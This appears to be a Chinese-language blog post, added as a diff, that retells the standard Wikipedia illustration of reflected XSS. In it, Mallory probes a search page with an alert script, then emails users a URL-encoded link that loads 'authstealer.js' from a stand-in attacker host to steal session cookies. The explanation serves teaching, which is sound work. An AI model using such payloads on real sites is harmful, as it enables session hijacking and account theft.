@@ -1,0 +1,25 @@
+---
+layout: post
+---
+
+wiki里讲了两个xss攻击的例子. 第一个是非持续性xss(Non-persistent)，也成为Reflected xss.
+
+## Non-persistent
+
+Alice 经常去一个Bob的网站，且Bob的网站允许Alice使用username/password登录和存储一些敏感信息，例如账单信息
+当用户登录的时候Bob会将认证凭据存到Cookie中以供client到server端验证身份。
+
+Mallory发现Bob的网站存在reflected xss 漏洞, 过程如下:
+
+* 当在搜索页面，Mallory输入一些词汇并点击提交按钮, 如果找不到结果Bpb的页面会提示这个词汇 Not found, 此时的页面URL为`http://bobwebsite.com?q=her input term`
+
+* 对于一个正常的搜索，例如`pupples`, 如果该搜索页面未找到的话会提示`pupples not found`, 此时的url为`http://bobwebsite.com?q=pupples`
+
+* 然而，让Mallory提交一个正常的搜索请求，例如`<script type='text/javascript'>alert('xss');</script>`, 出现下面几个现象: 1. 一个弹窗出现，弹出"xss", 2.伴随着弹窗的同时页面显示`<script type='text/javascript'>alert('xss');</script> not found` 3. 此时的url为`http:blobwebsite.com?q=<script%20type='text/javascript'>alert('xss');</script>`
+
+
+发现了存在xss漏洞之后，Mallory手写了一个url: `http:blobwebsite.com?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E`, 看起来像一个正常的url，但是decode其中的hex字符之后，真实的url如下:`http:blobwebsite.com?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>`。
+
+接着Mallory将该地址通过email的形式发送给一些使用blobwebsite的成员，并且还告诉他们`点击查看可爱的小狗狗`
+
+当该email被alice打开的时候，即使Alice比较有心的查看了url之后恐怕也不会过度起疑。但是当Alice随手点开这条链接之后会看到`pupples not found`以及伴随着的Mallory脚本的执行。(此时便触发了xss攻击行为)。 这时候Mallory的脚本几乎可做任何事情, 包括将Alice的登录凭证Cookie发送给Mallory的服务器。 拿到登录凭证之后Mallory便可以伪装成Alice登录到blobwebsite，并且查看其敏感信息。
